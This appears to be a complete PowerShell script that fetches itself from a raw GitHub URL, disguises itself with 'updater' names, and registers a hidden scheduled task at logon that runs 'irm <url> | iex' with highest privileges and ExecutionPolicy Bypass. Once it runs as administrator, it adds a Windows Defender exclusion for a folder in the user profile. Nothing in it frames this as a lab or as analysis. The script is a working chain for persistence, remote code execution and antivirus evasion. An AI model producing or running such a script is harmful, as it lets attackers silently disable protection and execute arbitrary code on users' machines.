# ================================
# Web-Fetchable PowerShell Script
# Adds Defender Exclusion with UAC
# Delayed via Scheduled Task (1 min)
# ================================

# Define log path
$logPath = "$env:SystemRoot\Temp\updater_log.txt"
function Log($msg) {
    "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss") | Out-File -FilePath $logPath -Append -Encoding utf8
}

# Check current user context
Log "Script executed by user: $env:USERNAME"

# If not running interactively, schedule task
if (-not ([System.Environment]::UserInteractive)) {
    Log "⏳ Not in interactive session. Deferring via scheduled task..."

    $taskName = "UpdaterUACTrigger"
    $scriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"

    # Delete if already exists
    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false | Out-Null
        Log "🗑️ Deleted old task: $taskName"
    }

    # Create new task to run with delay (1 min after login)
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"irm $scriptUrl | iex`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn -Delay "00:01:00"
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -RunLevel Highest -LogonType Interactive

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
    Log "✅ Scheduled task '$taskName' created."
    exit
}

# Confirm admin rights
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Log "❌ Not running with admin rights. Cannot add exclusions."
    exit
} else {
    Log "✅ Running with admin rights."
}

# Add Defender exclusion
$folder = "$env:USERPROFILE\TestSafeFolder"
try {
    Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
    Log "✅ Exclusion added: $folder"
} catch {
    Log "❌ Failed to add exclusion: $folder. Error: $_"
}
